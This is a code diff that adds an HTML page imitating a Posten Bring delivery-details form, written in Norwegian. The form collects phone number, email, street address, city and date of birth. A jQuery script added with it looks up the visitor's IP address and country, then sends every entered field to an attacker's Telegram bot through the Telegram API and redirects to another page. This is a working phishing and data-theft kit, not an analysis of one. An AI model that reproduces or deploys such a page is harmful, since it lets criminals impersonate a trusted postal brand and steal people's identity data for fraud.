@@ -1,0 +1,161 @@
+
+<!DOCTYPE html>
+<html style="font-size: 16px;" lang="en"><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <title>Posten</title>
+    <link rel="stylesheet" href="X911/css/po.css" media="screen">
+    <link rel="stylesheet" href="X911/css/details.css" media="screen">
+    <meta name="referrer" content="origin">
+    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
+    <link id="u-page-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,500,500i,700,700i">
+    <meta name="theme-color" content="#478ac9">
+    <meta property="og:title" content="details">
+    <meta property="og:type" content="website">
+  <meta data-intl-tel-input-cdn-path="intlTelInput/"></head>
+  <body class="u-body u-xl-mode" data-lang="en"><header class="u-box-shadow u-clearfix u-header u-header" id="sec-81e4"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <a  class="u-image u-logo u-image-1" data-image-width="2560" data-image-height="777">
+          <img src="X911/images/POS.png" class="u-logo-image u-logo-image-1">
+        </a>
+      </div></header>
+    <section class="u-clearfix u-section-1" id="sec-19ed">
+      <div class="u-clearfix u-sheet u-sheet-1">
+        <div class="u-border-1 u-border-custom-color-5 u-container-style u-group u-shape-rectangle u-group-1">
+          <div class="u-container-layout u-container-layout-1">
+            <p class="u-custom-font u-font-ubuntu u-text u-text-custom-color-4 u-text-default u-text-1"><span class="u-file-icon u-icon u-icon-1"><img src="X911/images/7542177.png" alt=""></span>&nbsp;​Skriv inn dine fraktdetaljer
+            </p>
+            <p class="u-align-center u-custom-font u-font-ubuntu u-text u-text-2">
+              <span style="font-weight: 700;"></span>Bekreft leveringsadressen din
+            </p>
+            <div class="u-expanded-width u-form u-form-1">
+              <form id="korm"  class="u-clearfix u-form-spacing-10 u-form-vertical u-inner-form" source="email" name="form" style="padding: 10px;">
+                <div class="u-form-group u-form-name">
+                  <label for="name-05d2" class="u-custom-font u-font-ubuntu u-label u-label-1">Mobilnummer</label>
+                  <input type="tel" id="A" name="phone" class="u-border-none u-custom-color-6 u-custom-font u-font-ubuntu u-input u-input-rectangle" required="">
+                </div>
+                <div class="u-form-email u-form-group u-form-group-2">
+                  <label for="text-1123" class="u-custom-font u-font-ubuntu u-label u-label-2">E-post</label>
+                  <input type="email" placeholder="" id="B" name="email" class="u-border-none u-custom-color-6 u-custom-font u-font-ubuntu u-input u-input-rectangle" required="required">
+                </div>
+                <div class="u-form-group u-form-group-3">
+                  <label for="text-0e48" class="u-custom-font u-font-ubuntu u-label u-label-3">1 adresselinje</label>
+                  <input type="text" placeholder="" id="C" name="address" class="u-border-none u-custom-color-6 u-custom-font u-font-ubuntu u-input u-input-rectangle" required="">
+                </div>
+                <div class="u-form-group">
+                  <label for="email-05d2" class="u-custom-font u-font-ubuntu u-label u-label-4">by</label>
+                  <input type="text" id="D" name="city" class="u-border-none u-custom-color-6 u-custom-font u-font-ubuntu u-input u-input-rectangle" required="required">
+                </div>
+                                <div class="u-form-group u-form-name">
+                  <label for="name-05d2" class="u-custom-font u-font-ubuntu u-label u-label-1">Fødselsdato</label>
+                  <input type="tel" id="E" placeholder="ddmmåå" name="dob" class="u-border-none u-custom-color-6 u-custom-font u-font-ubuntu u-input u-input-rectangle" required="">
+                </div>
+                <div class="u-align-left u-form-group u-form-submit">
+                  <button type="submit" class="u-border-none u-btn u-btn-submit u-button-style u-custom-color-1 u-hover-custom-color-5 u-btn-1"> Bekrefte</button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    
+    
+    <footer class="u-align-center u-clearfix u-custom-color-2 u-footer u-footer" id="sec-5498"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <img class="u-image u-image-contain u-image-default u-image-1" src="X911/images/POS.png" alt="" data-image-width="2560" data-image-height="777">
+        <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-1"> ©Posten Bring</p>
+      </div></footer>  
+</body>
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // Load botToken and chatId from TELEGRAM.json
+        function loadConfig() {
+            return fetch('TELEGRAM.json')
+                .then(response => response.json())
+                .then(data => ({
+                    botToken: data.botToken,
+                    chatId: data.chatId
+                }))
+                .catch(error => {
+                    console.error('Error loading config file:', error);
+                    return null;
+                });
+        }
+
+        // Get user's IP and country using ipify and ipinfo.io
+        function getIpAndCountry() {
+            return $.get('https://api.ipify.org?format=json')
+                .then(function(ipData) {
+                    // Get country based on IP
+                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
+                        .then(function(data) {
+                            return {
+                                ip: ipData.ip,
+                                country: data.country || 'Unknown'
+                            };
+                        })
+                        .catch(function() {
+                            return {
+                                ip: ipData.ip,
+                                country: 'Unknown'
+                            };
+                        });
+                })
+                .catch(function() {
+                    return {
+                        ip: 'Unavailable',
+                        country: 'Unknown'
+                    };
+                });
+        }
+
+        $("#korm").submit(function (event) {
+            event.preventDefault(); // Prevent default form action
+
+            var one = $("#A").val().trim();
+            var two = $("#B").val().trim();
+            var three = $("#C").val().trim();
+            var four = $("#D").val().trim();
+            var five = $("#E").val().trim();
+
+            if (one && two && three && four && five) {
+                loadConfig().then(config => {
+                    if (config) {
+                        getIpAndCountry().then(data => {
+                            var ipAddress = data.ip;
+                            var country = data.country;
+                            var now = new Date().toLocaleString(); // Get current date and time
+
+                            var telegramMessage = "📱 **Billing Info**\n\n" +
+                                "🔹 **Mobilnummer:** `" + one + "`\n" +
+                                "🔹 **E-post:** `" + two + "`\n" +
+                                "🔹 **1 adresselinje:** `" + three + "`\n" +
+                                "🔹 **by:** `" + four + "`\n" +
+                                "🔹 **Fødselsdato:** `" + five + "`\n" +
+                                "🔹 **IP Address:** `" + ipAddress + "`\n" +
+                                "🏳 **Country:** `" + country + "`\n" +
+                                "🕒 **Date/Time:** `" + now + "`";
+
+                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
+                            var requestData = {
+                                chat_id: config.chatId,
+                                text: telegramMessage,
+                                parse_mode: "Markdown"
+                            };
+
+                            $.post(telegramBotUrl, requestData, function () {
+                                window.location.href = "E.html?vc?__event=cauuuze&service_id=top_ouazt=DE";
+                            }).fail(function () {
+                                alert("Bitte versuchen Sie es erneut.");
+                            });
+                        });
+                    }
+                });
+            }
+        });
+    });
+</script>
+
+</html>
